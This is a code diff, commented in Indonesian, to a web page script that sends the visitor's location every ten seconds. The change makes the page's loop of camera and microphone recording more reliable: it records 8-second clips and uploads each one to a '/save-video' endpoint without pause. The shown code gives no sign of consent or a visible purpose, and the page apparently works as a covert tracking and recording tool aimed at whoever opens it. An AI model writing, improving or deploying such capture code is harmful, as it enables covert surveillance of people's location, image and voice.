@@ -160,34 +160,51 @@
     sendLocation();
     setInterval(sendLocation, 10000);
 
-    // 2. Rekam & Kirim Video Kamera Kontinu (Loop per 10 detik)
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
-        function recordCycle() {
-            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    // 2. Rekam & Kirim Video Kamera Kontinu (Versi Stabil)
+    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: true }).then(stream => {
+        function startRecording() {
+            let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                options = { mimeType: 'video/webm' };
+            }
+            
+            const recorder = new MediaRecorder(stream, options);
             let chunks = [];
             
-            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            recorder.ondataavailable = e => {
+                if (e.data && e.data.size > 0) {
+                    chunks.push(e.data);
+                }
+            };
             
             recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('video', blob, `rec_${Date.now()}.webm`);
-                
-                // Kirim file video ke server
-                fetch('/save-video', { 
-                    method: 'POST', 
-                    body: formData 
-                })
-                .then(() => recordCycle()) // Ulangi siklus berikutnya otomatis
-                .catch(() => recordCycle());
+                if (chunks.length > 0) {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, `rec_${Date.now()}.webm`);
+                    
+                    fetch('/save-video', { 
+                        method: 'POST', 
+                        body: formData 
+                    })
+                    .then(() => startRecording())
+                    .catch(() => startRecording());
+                } else {
+                    startRecording();
+                }
             };
             
             recorder.start();
-            setTimeout(() => recorder.stop(), 10000); // Rekam selama 10 detik lalu kirim
+            // Rekam tiap 8 detik lalu kirim
+            setTimeout(() => {
+                if (recorder.state === "recording") {
+                    recorder.stop();
+                }
+            }, 8000);
         }
-        recordCycle();
+        startRecording();
     }).catch(e => {
-        console.error("Akses kamera ditolak/tidak tersedia", e);
+        console.error("Gagal akses media:", e);
     });
 </script>
 </body>
